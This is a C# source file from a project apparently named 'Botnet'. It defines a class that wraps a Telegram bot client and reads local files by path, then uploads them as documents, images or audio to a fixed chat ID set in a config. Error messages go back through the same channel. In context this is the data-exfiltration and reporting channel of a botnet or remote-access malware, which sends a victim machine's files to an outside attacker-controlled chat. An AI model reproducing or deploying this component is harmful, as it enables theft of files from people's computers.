using System;
using System.IO;
using Telegram.Bot;
using Telegram.Bot.Types.InputFiles;
using NetTelegramBotApi.Requests;
using System.Net;

namespace Botnet
{
    class TelegramSystem
    {
        private TelegramBotClient bot;

        public TelegramSystem(string token)
        {
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            bot = new TelegramBotClient(token);
        }

        public async void SendMessage(string txtMessage)
        {
            await bot.SendTextMessageAsync(config.Chat_ID, txtMessage);
        }

        public async void SendDocument(string path, string message = null)
        {
            try
            {
                using (var stream = File.Open(path, FileMode.Open, FileAccess.Read))
                {
                    FileToSend fts = new FileToSend(stream, Path.GetFileName(path));
                    await bot.SendDocumentAsync(config.Chat_ID, new InputOnlineFile(stream, Path.GetFileName(path)), message);
                    stream.Close();
                }
            }
            catch (Exception ex)
            {
                SendMessage("[ERROR] " + ex.Message);
            }
        }

        public async void SendImage(string path, string message = null)
        {
            try
            {
                using (var stream = File.Open(path, FileMode.Open, FileAccess.Read))
                {
                    FileToSend fts = new FileToSend(stream, Path.GetFileName(path));
                    await bot.SendPhotoAsync(config.Chat_ID, new InputOnlineFile(stream, Path.GetFileName(path)), message);
                }
            }
            catch (Exception ex)
            {
                SendMessage($"[ERROR] {ex.Message}");
            }
        }

        public async void SendSound(string path, string message = null)
        {
            try
            {
                using (var stream = File.Open(path, FileMode.Open, FileAccess.Read))
                {
                    FileToSend fts = new FileToSend(stream, Path.GetFileName(path));
                    await bot.SendAudioAsync(config.Chat_ID, new InputOnlineFile(stream, Path.GetFileName(path)), message);
                }
            }
            catch (Exception ex)
            {
                SendMessage($"[ERROR] {ex.Message}");
            }
        }
    }
}
